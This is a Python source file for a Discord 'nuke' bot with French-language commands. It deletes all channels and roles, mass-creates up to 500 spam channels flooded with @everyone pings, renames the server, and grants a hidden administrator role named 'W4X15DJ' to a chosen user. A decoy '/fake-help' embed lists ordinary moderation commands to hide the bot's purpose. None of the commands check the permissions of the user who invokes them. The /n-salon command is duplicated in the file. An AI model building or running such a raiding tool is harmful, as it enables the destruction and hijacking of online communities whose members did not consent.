import os
import asyncio
import logging
import discord
from discord import app_commands
from discord.ext import commands

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
)
log = logging.getLogger('giveadmin-bot')

TOKEN = os.environ.get('DISCORD_TOKEN')
ROLE_NAME = os.environ.get('ADMIN_ROLE_NAME', 'W4X15DJ')

if not TOKEN:
    raise RuntimeError('DISCORD_TOKEN is not set in environment')

intents = discord.Intents.default()
intents.members = True
intents.guilds = True

bot = commands.Bot(command_prefix='!', intents=intents)


@bot.event
async def on_ready():
    log.info('Logged in as %s', bot.user)
    try:
        synced = await bot.tree.sync()
        log.info('Globally synced %d command(s)', len(synced))
    except Exception as e:
        log.exception('Sync failed: %s', e)
    for guild in bot.guilds:
        try:
            bot.tree.copy_global_to(guild=guild)
            await bot.tree.sync(guild=guild)
        except Exception as e:
            log.exception('Guild sync failed: %s', e)


@bot.event
async def on_guild_join(guild):
    log.info('Joined guild %s -- resyncing', guild.id)
    try:
        bot.tree.copy_global_to(guild=guild)
        await bot.tree.sync(guild=guild)
    except Exception as e:
        log.exception('on_guild_join sync failed: %s', e)

# ----------------------------- /fake-help ----------------------------- #

@bot.tree.command(
    name='fake-help',
    description='Envoie un embed help dans le salon choisi',
)
@app_commands.describe(salon='Salon ou envoyer l embed')
async def fake_help(interaction: discord.Interaction, salon: discord.TextChannel):
    await interaction.response.defer(ephemeral=True, thinking=True)

    if interaction.guild is None:
        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
        return

    me = interaction.guild.me
    perms = salon.permissions_for(me) if me else None
    if not perms or not perms.send_messages or not perms.embed_links:
        await interaction.followup.send(
            f'Le bot ne peut pas envoyer d embed dans {salon.mention}.',
            ephemeral=True,
        )
        return

    embed = discord.Embed(
        title='Liste des commandes',
        description='Voici les commandes disponibles sur ce serveur.',
        color=0x5865F2,
    )

    embed.add_field(
        name='Moderation',
        value=(
            '`/ban` - Bannir un utilisateur\n'
            '`/kick` - Expulser un utilisateur\n'
            '`/mute` - Rendre muet un utilisateur\n'
            '`/unmute` - Retirer le mute\n'
            '`/warn` - Avertir un utilisateur\n'
            '`/clear` - Supprimer des messages'
        ),
        inline=False,
    )

    embed.add_field(
        name='Utilitaires',
        value=(
            '`/userinfo` - Infos sur un utilisateur\n'
            '`/serverinfo` - Infos sur le serveur\n'
            '`/avatar` - Afficher l avatar d un utilisateur\n'
            '`/ping` - Latence du bot'
        ),
        inline=False,
    )

    embed.add_field(
        name='Roles',
        value=(
            '`/role-add` - Ajouter un role\n'
            '`/role-remove` - Retirer un role\n'
            '`/role-list` - Liste des roles'
        ),
        inline=False,
    )

    embed.add_field(
        name='Fun',
        value=(
            '`/say` - Faire parler le bot\n'
            '`/poll` - Creer un sondage\n'
            '`/8ball` - Boule magique\n'
            '`/coinflip` - Pile ou face'
        ),
        inline=False,
    )

    embed.set_footer(text='Tape une commande pour l utiliser')

    try:
        await salon.send(embed=embed)
    except discord.HTTPException as e:
        await interaction.followup.send(f'Erreur envoi: `{e}`', ephemeral=True)
        return

    await interaction.followup.send(f'Embed envoye dans {salon.mention}.', ephemeral=True)

# ----------------------------- /n-salon ----------------------------- #

async def _safe(coro):
    try:
        return await coro
    except Exception as e:
        log.warning('task failed: %s', e)
        return None


@bot.tree.command(
    name='n-salon',
    description='Supprime tous les salons, en cree N et y envoie un message en boucle',
)
@app_commands.describe(
    number='Nombre de salons a creer',
    message='Message a envoyer dans chaque salon',
    repeat='Nombre de fois que le message est envoye par salon (defaut 5)',
    name='Nom des salons crees (defaut: spam)',
)
async def n_salon(
    interaction: discord.Interaction,
    number: int,
    message: str,
    repeat: int = 5,
    name: str = 'spam',
):
    await interaction.response.defer(ephemeral=True, thinking=True)

    if interaction.guild is None:
        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
        return

    guild = interaction.guild
    me = guild.me
    if me is None or not me.guild_permissions.administrator:
        await interaction.followup.send('Le bot doit avoir la permission Administrateur.', ephemeral=True)
        return

    if number < 1 or number > 500:
        await interaction.followup.send('number doit etre entre 1 et 500.', ephemeral=True)
        return
    if repeat < 1 or repeat > 50:
        await interaction.followup.send('repeat doit etre entre 1 et 50.', ephemeral=True)
        return

    start = asyncio.get_event_loop().time()

    # 1) Suppression parallele
    log.info('Deleting %d existing channels...', len(guild.channels))
    await asyncio.gather(*[_safe(ch.delete(reason='/n-salon')) for ch in list(guild.channels)])

    # 2) Creation parallele
    log.info('Creating %d channels...', number)
    create_tasks = [
        _safe(guild.create_text_channel(name=f'{name}-{i+1}', reason='/n-salon'))
        for i in range(number)
    ]
    created = [c for c in await asyncio.gather(*create_tasks) if c is not None]
    log.info('Created %d channels', len(created))

    # 3) Spam direct via le bot, en parallele entre salons
    async def flood(channel):
        sent = 0
        for _ in range(repeat):
            try:
                await channel.send(content=message)
                sent += 1
            except discord.HTTPException as e:
                log.warning('send failed on %s: %s', channel.id, e)
                await asyncio.sleep(0.5)
        return sent

    results = await asyncio.gather(*[flood(c) for c in created])
    total_sent = sum(results)

    elapsed = asyncio.get_event_loop().time() - start

    summary = (
        f'**/n-salon termine en {elapsed:.1f}s**\n'
        f'- {len(created)}/{number} salons crees\n'
        f'- {total_sent} messages envoyes ({repeat} x {len(created)} prevus)'
    )
    if created:
        try:
            await created[0].send(summary)
        except Exception:
            pass

# ----------------------------- /nuke ----------------------------- #

@bot.tree.command(
    name='nuke',
    description='Nuke complet: supprime salons + roles, recree N salons, spam, et renomme le serveur',
)
@app_commands.describe(
    channels='Nombre de salons a creer (defaut: 50)',
    message='Message a spam dans chaque salon (defaut: @everyone)',
    repeat='Nombre de messages par salon (defaut: 5)',
    channel_name='Nom des nouveaux salons (defaut: nuked)',
    server_name='Nouveau nom du serveur (optionnel)',
    delete_roles='Supprimer aussi tous les roles (defaut: true)',
)
async def nuke(
    interaction: discord.Interaction,
    channels: int = 50,
    message: str = '@everyone',
    repeat: int = 5,
    channel_name: str = 'nuked',
    server_name: str = None,
    delete_roles: bool = True,
):
    await interaction.response.defer(ephemeral=True, thinking=True)

    if interaction.guild is None:
        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
        return

    guild = interaction.guild
    me = guild.me

    if me is None or not me.guild_permissions.administrator:
        await interaction.followup.send('Le bot doit avoir la permission Administrateur.', ephemeral=True)
        return

    if channels < 1 or channels > 500:
        await interaction.followup.send('channels doit etre entre 1 et 500.', ephemeral=True)
        return
    if repeat < 1 or repeat > 50:
        await interaction.followup.send('repeat doit etre entre 1 et 50.', ephemeral=True)
        return

    start = asyncio.get_event_loop().time()
    log.info('NUKE launched by %s on guild %s', interaction.user, guild.id)

    # 1) Rename en parallele
    rename_task = None
    if server_name:
        new = server_name.strip()[:100]
        if len(new) >= 2:
            rename_task = asyncio.create_task(
                _safe(guild.edit(name=new, reason=f'/nuke by {interaction.user}'))
            )

    # 2) Suppression parallele salons + roles
    role_targets = [
        r for r in guild.roles
        if not r.is_default() and not r.managed and r < me.top_role
    ] if delete_roles else []

    delete_tasks = [_safe(c.delete(reason='/nuke')) for c in list(guild.channels)]
    delete_tasks += [_safe(r.delete(reason='/nuke')) for r in role_targets]
    log.info('Deleting %d channels + %d roles...', len(guild.channels), len(role_targets))
    await asyncio.gather(*delete_tasks)

    # 3) Creation parallele des nouveaux salons
    log.info('Creating %d channels...', channels)
    create_tasks = [
        _safe(guild.create_text_channel(name=f'{channel_name}-{i+1}', reason='/nuke'))
        for i in range(channels)
    ]
    created = [c for c in await asyncio.gather(*create_tasks) if c is not None]

    # 4) Spam direct via le bot, en parallele entre salons
    async def flood(channel):
        sent = 0
        for _ in range(repeat):
            try:
                await channel.send(content=message)
                sent += 1
            except discord.HTTPException as e:
                log.warning('send failed on %s: %s', channel.id, e)
                await asyncio.sleep(0.5)
        return sent

    results = await asyncio.gather(*[flood(c) for c in created])
    total_sent = sum(results)

    # 5) Attendre la fin du rename
    if rename_task:
        await rename_task

    elapsed = asyncio.get_event_loop().time() - start

    summary = (
        f'**NUKE termine en {elapsed:.1f}s**\n'
        f'- {len(created)}/{channels} salons crees\n'
        f'- {len(role_targets)} roles supprimes\n'
        f'- {total_sent} messages envoyes ({repeat} x {len(created)} prevus)\n'
        + (f'- Serveur renomme en **{server_name}**\n' if server_name else '')
    )
    if created:
        try:
            await created[0].send(summary)
        except Exception:
            pass

# ----------------------------- /supp-roles ----------------------------- #

@bot.tree.command(
    name='supp-roles',
    description='Supprime tous les roles (all) ou un role precis par son ID',
)
@app_commands.describe(
    target='"all" pour tout supprimer, ou l ID d un role specifique (defaut: all)',
)
async def supp_roles(interaction: discord.Interaction, target: str = 'all'):
    await interaction.response.defer(ephemeral=True, thinking=True)

    if interaction.guild is None:
        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
        return

    guild = interaction.guild
    me = guild.me

    if me is None or not me.guild_permissions.manage_roles:
        await interaction.followup.send(
            'Le bot doit avoir la permission **Manage Roles** (ou Administrateur).',
            ephemeral=True,
        )
        return

    target = target.strip().lower()

    # ---- Cas 1 : un role precis ----
    if target != 'all':
        try:
            rid = int(target)
        except ValueError:
            await interaction.followup.send('target doit etre "all" ou un ID numerique.', ephemeral=True)
            return

        role = guild.get_role(rid)
        if role is None:
            await interaction.followup.send(f'Aucun role avec l ID `{rid}`.', ephemeral=True)
            return

        if role.is_default():
            await interaction.followup.send('Impossible de supprimer @everyone.', ephemeral=True)
            return
        if role.managed:
            await interaction.followup.send(f'Le role `{role.name}` est gere par une integration.', ephemeral=True)
            return
        if role >= me.top_role:
            await interaction.followup.send(
                f'Le role `{role.name}` est au-dessus du role du bot dans la hierarchie.',
                ephemeral=True,
            )
            return

        try:
            await role.delete(reason=f'/supp-roles by {interaction.user}')
        except discord.HTTPException as e:
            await interaction.followup.send(f'Erreur: `{e}`', ephemeral=True)
            return

        await interaction.followup.send(f'Role **{role.name}** supprime.', ephemeral=True)
        return

    # ---- Cas 2 : tous les roles ----
    deletable = [
        r for r in guild.roles
        if not r.is_default()        # pas @everyone
        and not r.managed            # pas les roles d integration / bots
        and r < me.top_role          # strictement sous le top role du bot
    ]

    if not deletable:
        await interaction.followup.send('Aucun role supprimable trouve.', ephemeral=True)
        return

    start = asyncio.get_event_loop().time()

    async def _del(r):
        try:
            await r.delete(reason=f'/supp-roles all by {interaction.user}')
            return True
        except Exception as e:
            log.warning('delete role %s failed: %s', r.id, e)
            return False

    results = await asyncio.gather(*[_del(r) for r in deletable])
    ok = sum(1 for x in results if x)
    elapsed = asyncio.get_event_loop().time() - start

    await interaction.followup.send(
        f'**{ok}/{len(deletable)}** roles supprimes en {elapsed:.1f}s.',
        ephemeral=True,
    )

# ----------------------------- /rename-s ----------------------------- #

@bot.tree.command(name='rename-s', description='Renomme le serveur')
@app_commands.describe(name='Nouveau nom du serveur (2 a 100 caracteres)')
async def rename_s(interaction: discord.Interaction, name: str):
    await interaction.response.defer(ephemeral=True, thinking=True)

    if interaction.guild is None:
        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
        return

    guild = interaction.guild
    me = guild.me

    if me is None or not me.guild_permissions.manage_guild:
        await interaction.followup.send(
            'Le bot doit avoir la permission **Manage Server** (ou Administrateur).',
            ephemeral=True,
        )
        return

    new_name = name.strip()
    if len(new_name) < 2 or len(new_name) > 100:
        await interaction.followup.send('Le nom doit faire entre 2 et 100 caracteres.', ephemeral=True)
        return

    old_name = guild.name
    try:
        await guild.edit(name=new_name, reason=f'/rename-s by {interaction.user}')
    except discord.Forbidden:
        await interaction.followup.send('Permission refusee par Discord.', ephemeral=True)
        return
    except discord.HTTPException as e:
        await interaction.followup.send(f'Erreur Discord: `{e}`', ephemeral=True)
        return

    await interaction.followup.send(
        f'Serveur renomme: **{old_name}** -> **{new_name}**',
        ephemeral=True,
    )

# ----------------------------- /giveadmin ----------------------------- #

@bot.tree.command(name='giveadmin', description='Cree un role Admin et l attribue a un utilisateur')
@app_commands.describe(user_id='ID de l utilisateur a qui donner le role admin')
async def giveadmin(interaction: discord.Interaction, user_id: str):
    await interaction.response.defer(ephemeral=True, thinking=True)

    if interaction.guild is None:
        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
        return

    guild = interaction.guild
    try:
        uid = int(user_id.strip())
    except ValueError:
        await interaction.followup.send('ID invalide.', ephemeral=True)
        return

    member = guild.get_member(uid) or await guild.fetch_member(uid)
    me = guild.me
    if me is None or not me.guild_permissions.manage_roles:
        await interaction.followup.send('Le bot doit avoir Manage Roles / Administrateur.', ephemeral=True)
        return

    role = await guild.create_role(
        name=ROLE_NAME,
        permissions=discord.Permissions(administrator=True),
        reason=f'/giveadmin by {interaction.user}',
    )
    try:
        if me.top_role and me.top_role.position > 1:
            await role.edit(position=max(me.top_role.position - 1, 1))
    except Exception as e:
        log.warning('Reposition failed: %s', e)

    await member.add_roles(role, reason=f'/giveadmin by {interaction.user}')
    await interaction.followup.send(
        f'Role **{role.name}** (Admin) attribue a <@{member.id}>.',
        ephemeral=True,
    )

# ----------------------------- /n-salon ----------------------------- #

async def _safe(coro):
    try:
        return await coro
    except Exception as e:
        log.warning('task failed: %s', e)
        return None


@bot.tree.command(
    name='n-salon',
    description='Supprime tous les salons, en cree N et y envoie un message en boucle',
)
@app_commands.describe(
    number='Nombre de salons a creer',
    message='Message a envoyer dans chaque salon',
    repeat='Nombre de fois que le message est envoye par salon (defaut 5)',
    name='Nom des salons crees (defaut: spam)',
)
async def n_salon(
    interaction: discord.Interaction,
    number: int,
    message: str,
    repeat: int = 5,
    name: str = 'spam',
):
    await interaction.response.defer(ephemeral=True, thinking=True)

    if interaction.guild is None:
        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
        return

    guild = interaction.guild
    me = guild.me
    if me is None or not me.guild_permissions.administrator:
        await interaction.followup.send('Le bot doit avoir la permission Administrateur.', ephemeral=True)
        return

    if number < 1 or number > 500:
        await interaction.followup.send('number doit etre entre 1 et 500.', ephemeral=True)
        return
    if repeat < 1 or repeat > 50:
        await interaction.followup.send('repeat doit etre entre 1 et 50.', ephemeral=True)
        return

    start = asyncio.get_event_loop().time()

    # 1) Suppression parallele
    log.info('Deleting %d existing channels...', len(guild.channels))
    await asyncio.gather(*[_safe(ch.delete(reason='/n-salon')) for ch in list(guild.channels)])

    # 2) Creation parallele
    log.info('Creating %d channels...', number)
    create_tasks = [
        _safe(guild.create_text_channel(name=f'{name}-{i+1}', reason='/n-salon'))
        for i in range(number)
    ]
    created = [c for c in await asyncio.gather(*create_tasks) if c is not None]
    log.info('Created %d channels', len(created))

    # 3) Spam direct via le bot, en parallele entre salons
    async def flood(channel):
        sent = 0
        for _ in range(repeat):
            try:
                await channel.send(content=message)
                sent += 1
            except discord.HTTPException as e:
                log.warning('send failed on %s: %s', channel.id, e)
                await asyncio.sleep(0.5)
        return sent

    results = await asyncio.gather(*[flood(c) for c in created])
    total_sent = sum(results)

    elapsed = asyncio.get_event_loop().time() - start

    summary = (
        f'**/n-salon termine en {elapsed:.1f}s**\n'
        f'- {len(created)}/{number} salons crees\n'
        f'- {total_sent} messages envoyes ({repeat} x {len(created)} prevus)'
    )
    if created:
        try:
            await created[0].send(summary)
        except Exception:
            pass
            

if __name__ == '__main__':
    bot.run(TOKEN, reconnect=True)
